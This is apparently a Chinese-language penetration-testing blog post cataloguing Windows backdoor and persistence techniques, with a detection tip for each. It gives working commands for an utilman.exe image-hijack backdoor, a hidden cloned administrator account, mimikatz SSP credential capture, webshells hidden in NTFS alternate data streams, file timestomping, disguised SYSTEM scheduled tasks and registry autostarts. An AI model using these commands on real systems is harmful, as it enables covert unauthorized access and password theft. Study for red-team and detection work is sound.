# TL；DR
  * Definition - What does Persistence mean?  
Persistence refers to object and process characteristics that continue to
exist even after the process that created it ceases or the machine it is
running on is powered off. When an object or state is created and needs to be
persistent, it is saved in a non-volatile storage location, like a hard drive,
versus a temporary file or volatile random access memory (RAM
  * 这里把自己认知里面的一些windows backdoor和persistence的方式方法总结一下，并尽量持续更新。
# 常见backdoor和persistence方式方法
### 系统工具替换后门
  * 顾名思义就是替换系统自带的可执行文件进行利用，有直接替换及通过注册表替换方式，直接替换不用解释，本地编译好直接复制替换即可，当某个行为行为触发执行这个可执行文件的时候，后门即被执行（早期的粘滞键后门（即shift即是直接替换后门）​，注册表的话可以通过以下命令实现任意可执行文件的劫持。 
        Image 劫持辅助工具管理器
    REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" /t REG_SZ /v Debugger /d "C:\windows\system32\cmd.exe" /f
  * 类似的程序有osk.exe、Narrator.exe、Magnify.exe等。
  * 优点：简单
  * 缺点：易被检测
  * 排查：工具autoruns
  * 20191016更新  
参考文章[打造不一样的Shfit映像劫持后门](https://mp.weixin.qq.com/s?__biz=Mzg4MzA4Nzg4Ng==&mid=2247483994&idx=1&sn=4041632680d059c6d9ed0aba0701ca71&chksm=cf4d8d3bf83a042d23216c02418ccbd377103f65b1b0eed0cbad61b055966bccd24c7637e495&mpshare=1&scene=23&srcid=&sharer_sharetime=1571196868049&sharer_shareid=be7a01e2434a36782542fb17e9d2a6e8#rd)  
用到了windows
sdk里的gflags.exe工具([工具下载地址](https://kevien.github.io/downloads/gflags.rar))，这个工具里面有个silent
process
exit功能，大意是在调试某个程序静态退出的时候可以关联绑定某个程序去静默执行，工具对注册表一些键值进行了修改，此外通过autoruns工具检测不出来。  
### 后门账号
  * 创建克隆administrator账号，且通过命令net user 以及控制面板中的管理账户无法看到。  
1.创建后门用户
        net user defaultuser0$ somepasswordhere /add /y
    net localgroup administrators defaultuser0$ /add
    net localgroup "remote desktop users" defaultuser0$ /add
2.之后将administrator用户对应的Users中的F值复制替换后门账户的F值  
3.导出User下面的后门账户以及name下面的后门账户两个文件。  
4.通过命令删除刚才的后门用户
        net user defaultuser0$ /del
5.通过注册表导入刚才保存的两个注册表  
  * 参考文章 [Windows系统的帐户隐藏](https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%B8%90%E6%88%B7%E9%9A%90%E8%97%8F/)
### 明文账号记录
  * 安全支持提供程序（SSP）是Windows API，用于扩展Windows身份验证机制。 LSASS进程在Windows启动期间加载安全支持提供程序DLL。这个时候攻击者可以将精心构造的dll加载之，这个dll可获取到lsass进程中的明文账号密码信息。mimikatz(mimilib.dll或memssp内存补丁方式)实现了这一功能，并把记录到的明文账号密码信息保存在本地。
  * 详见文章[Persistence – Security Support Provider](https://pentestlab.blog/2019/10/21/persistence-security-support-provider/)
### 文件隐藏
#### attrib命令隐藏
  * windows自带命令行工具attrib用来显示或更改文件属性。  
~~* 优点:简单,一般的工具(D盾)扫描不到~~
  * 优点:简单
  * 缺点:易发现
  * 排查:使用attrib命令或显示隐藏文件和受保护的操作系统文件即可发现。
#### 使用ADS流隐藏webshell(重点!!)
  * 1993年微软推出了基于流行的NT平台的Windows NT操作系统。之后，NTFS作为WIndows开发基于NT的操作系统时的首选文件系统，逐步取代被应用于旧版Windows操作系统（比如Windows 9x）的文件系统，即FAT（File Access Table）。
  * NTFS中的备用数据流（Alternate Data Stream，ADS）允许将一些元数据嵌入文件或是目录，而不需要修改其原始功能或内容。
  * 在NTFS中，主数据流指的是文件或目录的标准内容，通常对用户可见，而备用数据流（ADS）则隐藏。如果要查看备用数据流，可以使用dir命令的/R选项，或是Windows提供的streams.exe工具，没有可用的API。
  * ADS没有大小限制且多个数据流可以和一个正常文件关联。ADS的内容也不仅限于text文本数据，基本上只要是二进制格式文件都可以被作为ADS备用流嵌入。
  * 使用ADS流隐藏webshell,目前可过D盾扫描,注意ADS的一句话木马无法直接连接，可以使用php的include去包含执行  
文章参考：[利用ADS隐藏webshell](https://www.cnblogs.com/xiaozi/p/7610984.html)  
文章参考： [Windows
ADS在渗透测试中的妙用](https://www.freebuf.com/articles/terminal/195721.html)
  * 此外应该注意修改文件的timestamp，可使用如下的powershell命令或者使用NewFileTime工具
    $(Get-Item ).creationtime=$(Get-Date "mm/dd/yyyy hh:mm am/pm")
    $(Get-Item ).lastaccesstime=$(Get-Date "mm/dd/yyyy hh:mm am/pm")
    $(Get-Item ).lastwritetime=$(Get-Date "mm/dd/yyyy hh:mm am/pm")
    example：
    Set the last-access time for a file aaa.csv to the current time:  $(Get-Item aaa.csv).lastwritetime=$(Get-Date)
    Set the creation time of a file foo.txt to November 24, 2015, at 6:00am: $(Get-Item foo.txt).creationtime=$(Get-Date "11/24/2015 06:00 am")
  * 优点：较难检测
  * 缺点：暂无
  * 排查： dir /r
### 计划任务
  * windows下可使用schtasks和at命令创建计划任务，其中at命令在新版的windows中已被弃用。
    #from https://github.com/diggles9991/MG/blob/master/XMR/Hook.ps1#L12
    # Update scheduled Start Task
    SCHTASKS /Delete /tn "AdobeReaderUpdate" /f
    SCHTASKS /Create /RU "SYSTEM" /tn "AdobeReaderUpdate" /sc Weekly /d * /st 18:00:00 /tr "powershell.exe C:\Windows\System32\drivers\en-US\etc\Line.ps1"
    # Update scheduled End Task
    # SCHTASKS /Delete /tn "AdobeReaderUpdateEnd" /f
    SCHTASKS /Create /RU "SYSTEM" /tn "AdobeReaderUpdateEnd" /sc Weekly /d MON,TUE,WED,THU,FRI /st 06:00:00 /tr "powershell.exe Stop-Process -Name $processname"
    # At command
    at 1:00AM /Every:Saturday My_BackUp.bat 
    在每个Saturday的早上1:00点，定时启动My_BackUp.bat批处理文件。
  * 优点：简单
  * 缺点：易被检测
  * 排查： schtasks /query 命令进行查询或者通过计算机的管理查看，注意在windows的中文版系统中，schtasks命令需要切换字符为美国英语格式，使用命令chcp 437，或者直接工具autoruns。
### 开机启动项
  * 实现开机自启的方式有很多种（[详细大家可以参考autoruns检测项及原理](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082&seqNum=2)），其中注册表也有好多项可实现开机自启。
        HKEY_CURRENT_USER\Environment
    HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
    HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
    HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run
    命令
    REG ADD "HKEY_CURRENT_USER\Environment" /v UserInitMprLogonScript /t REG_SZ /d "C:\Users\Administrator\Desktop\mal.exe"
  * 优点：重启权限维持
  * 缺点：一般杀软均会拦截
  * 排查：一个一个手工查太麻烦，建议直接上autoruns。
  * 20191022更新
  * 利用windows原生API去创建regedit.exe不能展示和导出的键值对
  * 详见文章[invisible Reg Values](https://github.com/ewhitehats/InvisiblePersistence/blob/master/InvisibleRegValues_Whitepaper.pdf),缺点只是通过regedit.exe查看时候有隐藏效果，通过autoruns等工具还是会被发现。
### 服务
  * Windows服务是指Windows NT操作系统中的一种运行在后台的计算机程序。它在概念上类似于Unix守护进程。Windows服务可以配置为在操作系统启动时运行，并且在Windows运行期间持续在后台运行。服务也可以手动或基于某个事件而启动。我们可以通过运行services.msc查看当前系统的服务情况。 